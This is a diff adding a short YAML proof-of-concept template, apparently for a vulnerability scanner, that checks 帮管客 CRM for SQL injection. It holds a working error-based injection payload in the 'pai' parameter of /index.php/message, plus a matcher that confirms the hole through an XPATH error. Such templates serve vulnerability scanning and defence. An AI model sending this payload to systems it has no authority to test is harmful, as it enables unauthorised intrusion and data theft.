@@ -1,0 +1,15 @@
+id: poc-yaml-bang-guan-ke-crm-index-php-sqli
+info:
+  name: 帮管客CRM SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 帮管客 CRM
+variables:
+  t1: random_int(1,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(select+md5%28{{.t1}}%29),0x7e))%23&xu=desc
+  expression: status_code == 500 && contains(body,"XPATH syntax error") && contains(body,substr(t2,0,31))
+transport: http
